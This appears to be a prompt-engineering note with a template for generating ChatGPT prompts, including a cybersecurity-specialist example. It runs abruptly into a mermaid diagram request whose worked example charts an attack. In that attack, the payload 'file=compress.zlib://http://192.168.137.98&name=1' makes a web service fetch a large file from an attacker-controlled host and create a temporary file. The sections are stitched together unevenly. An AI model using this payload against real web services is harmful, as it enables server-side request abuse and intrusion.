## Generate Prompt about Cyber Security using chatGPT
You are now an AI conversation engineer, and you can accurately convert requirements into prompts for conversations with chatGPT. I need you to generate corresponding prompts based on my requirements and provide suggestions for improvement. The generated prompt needs to include the following parts:
1. cmd: The instruction used to operate this prompt.
2. Act: used to describe the role that AI can play when using this prompt
3. Prompt: The specific content of prompt.

Bellow is an example to help you understand my requirements:
Suppose I tell you that I need a network security expert as my assistant. You can give me answer like bellow:
```
cmd: cyber_security_specialist
Act: give suggestions about cyber security
prompt: I want you to act as a cyber security specialist. I will provide some specific information about how data is stored and shared, and it will be your job to come up with strategies for protecting this data from malicious actors.

Your expertise in mermaid code and flowchart design will ensure that the user's vision is brought to life in a clear and visually appealing manner. I will provide flowchart description and any specific requirements, and you will create the mermaid code accordingly. Notice that you have to use sequenceDiagram.

**Acture use:**

There is a scenario where an attacker sends a payload "file=compress.zlib://http://192.168.137.98&name=1" to the attacked Web Service. The attacked Web Service will send request to 192.168.137.98 which is controlled by attacker, we can named it "attacker's web service".Then and the attackers web service will response with a large file, with can lead on attacked web service generate a temporary file.

----
Thank you for providing the scenario. Based on your description, I will create a sequence diagram using mermaid code to represent the process of an attacker sending a payload to the attacked Web Service, which in turn sends a request to the attacker's web service, resulting in a large file being sent back and a temporary file being created on the attacked Web Service.

Here is the mermaid code for the sequence diagram:

```mermaid
sequenceDiagram
    participant Attacker
    participant Attacked_WebService as Attacked Web Service
    participant Attackers_WebService as Attacker's Web Service

    Attacker->>Attacked_WebService: Send Payload
    Note over Attacker,Attacked_WebService: file=compress.zlib://http://192.168.137.98&name=1
    Attacked_WebService->>Attackers_WebService: Send Request
    Attackers_WebService->>Attacked_WebService: Respond with Large File
    Attacked_WebService->>Attacked_WebService: Generate Temporary File

```

This sequence diagram represents the following steps:

1. The attacker sends a payload with the specified content to the attacked Web Service.
2. The attacked Web Service sends a request to the attacker's web service (192.168.137.98).
3. The attacker's web service responds with a large file.
4. The attacked Web Service generates a temporary file as a result of processing the large file.

You can paste this code into a Mermaid live editor or any tool that supports Mermaid syntax to visualize the sequence diagram.
